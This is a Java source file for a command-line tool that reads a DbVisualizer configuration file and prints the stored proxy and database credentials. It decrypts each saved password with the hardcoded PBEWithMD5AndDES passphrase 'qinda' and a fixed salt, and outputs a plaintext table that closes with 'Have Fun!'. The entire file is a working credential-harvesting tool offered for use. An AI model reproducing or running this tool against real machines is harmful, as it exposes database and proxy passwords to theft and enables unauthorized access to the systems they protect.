import java.nio.charset.StandardCharsets;

import java.util.List;
import java.util.Optional;
import java.util.function.Predicate;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.PBEParameterSpec;
 
import java.io.File;
import java.lang.reflect.RecordComponent;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Node;

public class DBVisDecrypt {

    public static void main(String[] argv) {
 
		System.out.println("[+] DbVisualizer Password Extractor and Decryptor.");
        if (argv[0].equals("-h") || argv[0].equals("-help") || argv.length != 2){
            printHelp();
            return;
        }

        if (argv[0].equals("-f") || argv[0].equals("-file")){
            File f = new File(argv[1]);
            if(!f.exists() || f.isDirectory()) {
                System.out.println("[+] File \""+argv[1]+"\" doesn't exist.");
                return;
            }

            String dbvisConfig = argv[1];
            System.out.println("[+] Extracting credentials from \n\t"+dbvisConfig);

            DBVisDecrypt Decryptor = new DBVisDecrypt();
            try{
                printTable(Decryptor.extractDatabases(dbvisConfig));
            }catch(NoSuchFieldException | SecurityException | IllegalAccessException e){
                System.out.println("[!] Error printing table! "+e);
            }

            System.out.println("\n[+] Done. Have Fun!");
            
        }else if (argv[0].equals("-p") || argv[0].equals("-password")){
            String password = argv[1];
            System.out.println("[+] Decrypting: "+password);
            try{
                System.out.println("[+] Plain Text: "+decrypt(password).orElse("<not found>"));
            }catch(Exception e){
                System.out.println("[!] Error decrypting! "+e);
            }
		}
	}
    
    /**
     * Record holding all credentials/info for a database.
     * Driver, Name, User name, Encrypted password, Decrypted password, and connection info
     */
	private record Database(String driver, String name, String user, String encryptedPass, String decryptedPass, String connectionInfo) {
        
		public Database(String driver, String name, String user, String encryptedPass, String decryptedPass, String connectionInfo){
            Predicate<String> predicate = field -> field != null && !field.trim().equals("");
			this.driver          = predicate.test(driver)         ? driver : "";
			this.name            = predicate.test(name)           ? name : "";
			this.user            = predicate.test(user)           ? user : "";
			this.encryptedPass   = predicate.test(encryptedPass)  ? encryptedPass : "";
			this.decryptedPass   = predicate.test(decryptedPass)  ? decryptedPass : "";
			this.connectionInfo  = predicate.test(connectionInfo) ? connectionInfo : "";
		}

        public Database(){
            this("","","","","","");
        }
        
        public String toString(List<Integer> maxLengths) throws NoSuchFieldException, SecurityException, IllegalAccessException{
            int i = 0;
            String finalStr = " ";
            int totalItems = Database.class.getDeclaredFields().length;
            for (RecordComponent field : Database.class.getRecordComponents()){
                String fieldValue = Database.class.getDeclaredField(field.getName()).get(this).toString();
                finalStr += fieldValue + " ".repeat(maxLengths.get(i++) - fieldValue.length() + 1);
                if (i < totalItems) finalStr += "| ";
            }
            return finalStr;
        }
	}

    /**
     * Record holding all info for a database connection.
     * Database Name, Server, Port
     */
    private record Connection(String database, String server, String port){

        public Connection() {
            this("","","");
        }
    }

    /**
     * Decrypt password given.
     * @param encryptedText encrypted password given
     * @return decrypted password 
     */
	private static Optional<String> decrypt(String encryptedText) {
 
		final byte[] salt = {-114, 18, 57, -100, 7, 114, 111, 90};
		final int iterations = 10;
        byte[] decryptedBytes = {};
        
        try{
            PBEKeySpec keySpec = new PBEKeySpec("qinda".toCharArray());
            SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBEWithMD5AndDES");
            SecretKey key = keyFactory.generateSecret(keySpec);
    
            PBEParameterSpec pbeParamSpec = new PBEParameterSpec(salt, iterations);
            Cipher cipher = Cipher.getInstance("PBEWithMD5AndDES");
            cipher.init( Cipher.DECRYPT_MODE, key, pbeParamSpec );
    
            decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(encryptedText));
            String decrypted = new String(decryptedBytes, StandardCharsets.UTF_8);

            return Optional.of(decrypted);
            
        }catch(Exception e){
            System.out.println("[!] Error decrypting password ("+encryptedText+")! "+e);
        }

        return Optional.empty();
	}

    /**
     * Extract data for database connections from configuration file.
     * @param configFile configuration file path
     * @return list of database data
     */
	private List<Database> extractDatabases(String configFile) {

        Document document = null;
        List<Database> creds = new ArrayList<Database>();
        creds.add(new Database("Driver","Name","User","Encrypted Password","Decrypted Password","Connection Info"));

        // Global Proxy 

        try{
            File file = new File(configFile);
            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();
            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();
            document = documentBuilder.parse(file);
        }catch(Exception e){
            System.out.println("[!] Error reading config file ("+configFile+")! "+e);
        }
        
        String driver    = "Proxy";
        String name      = "Default Proxy";
        String proxyUser = document.getElementsByTagName("ProxyUser").item(0).getTextContent();
        String proxyType = document.getElementsByTagName("ProxyType").item(0).getTextContent();
        String proxyHost = document.getElementsByTagName("ProxyHost").item(0).getTextContent();
        String proxyPort = document.getElementsByTagName("ProxyPort").item(0).getTextContent();
        String connInfo  = String.format("%s://%s:%s", proxyType, proxyHost, proxyPort);
        String proxyEncrPass = document.getElementsByTagName("ProxyPassword").item(0).getTextContent();
        String proxyDecrPass = "";

        if (!proxyEncrPass.equals("")){
            proxyDecrPass = decrypt(proxyEncrPass).orElse("");
        }
        
        creds.add(new Database(driver, name, proxyUser, proxyEncrPass, proxyDecrPass, connInfo));
        
        // Individual Databases

        Node dbs = document.getElementsByTagName("Databases").item(0);

        for (Node db = dbs.getFirstChild(); db != null; db = db.getNextSibling()){
            if (db.getNodeName().equals("#text")) continue;
            creds.add(getDatabaseInfo(db).orElse(new Database()));
        }

        return creds;
	}

    /**
     * Get database data from configuration file.
     * @param db node "Database" (parent node "Databases") from configuration file
     * @return database data (Alias, Notes, Url, Driver, Driverid, Userid, Profile,...)
     */
    private Optional<Database> getDatabaseInfo(Node db) {

        HashMap<String,String> cred = new HashMap<String,String>();
        for (Node child = db.getFirstChild(); child != null; child = child.getNextSibling()){
            String key = child.getNodeName();
            String value = child.getTextContent().trim();
            if (key != null && !key.equals("#text") && !key.equals("") &&
                value != null && !value.equals("#text") && !value.equals("")) {
                cred.put(key, value);
            }
        }
        String encryptedPass = cred.get("Password");
        String decryptedPass = encryptedPass != "" ? decrypt(encryptedPass).orElse("") : "";

        if (!encryptedPass.equals("")){
            String connInfo = cred.get("Url");
            if (connInfo == null){
                Connection urlVariables = getConnectionInfo(db);
                connInfo = String.format("%s://%s:%s", urlVariables.database(), urlVariables.server(), urlVariables.port());
            }
            return Optional.of(new Database(cred.get("Driver"), cred.get("Alias"), cred.get("Userid"),
                                            encryptedPass, decryptedPass, connInfo));
        }
        return Optional.empty(); 
    }

    /**
     * Get database's connection data from configuration file.
     * @param db node "Database" (parent node "Databases") from configuration file
     * @return connection info (Database, Server, Port)
     */
    private Connection getConnectionInfo(Node db) {

        HashMap<String,String> urlVariables = new HashMap<String,String>();
        Node urlVariablesNode = null;
        try{
            urlVariablesNode = getDirectChild(getDirectChild(db,"UrlVariables").orElseThrow(),"Driver").orElseThrow();
        }catch(Exception e){
            return new Connection();
        }
        
        for (Node child = urlVariablesNode.getFirstChild(); child != null; child = child.getNextSibling()){
            if (child.getNodeName().equals("UrlVariable")) {
                String key = child.getAttributes().getNamedItem("UrlVariableName").getTextContent();
                String value = child.getTextContent().trim();
                urlVariables.put(key, value);
            }
        }
        return new Connection(urlVariables.get("Database"),
                              urlVariables.get("Server"),
                              urlVariables.get("Port"));
    }

    /**
     * Get child of node based on child node's name.
     * @param parent parent node
     * @param name child node name
     * @return child node
     */
    private Optional<Node> getDirectChild(Node parent, String name) {

        for(Node child = parent.getFirstChild(); child != null; child = child.getNextSibling()){
            if(name.equals(child.getNodeName())) return Optional.of(child);
        }
        return Optional.empty(); 
    }

    /**
     * Print table with databases' data.
     * @param rows databases list
     */
	private static void printTable(List<Database> rows) throws NoSuchFieldException, SecurityException, IllegalAccessException{

        List<Integer> columnLengths = new ArrayList<>();
        
        for (RecordComponent value : Database.class.getRecordComponents()){
            columnLengths.add(rows.stream().mapToInt(db -> {
                try{
                    return Database.class.getDeclaredField(value.getName()).get(db).toString().length();
                }catch(Exception e){
                    return 0;
                }
                }).max().orElse(0));
        }
        
        for (int i = 0; i < rows.size(); i++){
            System.out.println(rows.get(i).toString(columnLengths));
            if (i == 0){
                String headerLine = columnLengths.stream()
                    .map(len -> "-".repeat(len + 2) + "+")
                    .reduce((s1,s2) -> s1.concat(s2))
                    .get();
                System.out.println(headerLine.substring(0,headerLine.length()-1));
            }
        }
	}

    /**
     * Print Help Menu.
     */
    private static void printHelp(){

        System.out.println("[+] Help menu.\n" +
                           "\tOptions:\n" +
                           "\t-f,-file <value>          Get data and decrypted passwords for every database in DBVis configuration file.\n" +
                           "\t-p,-password <value>      Decrypt specific password.\n"
        );
    }
}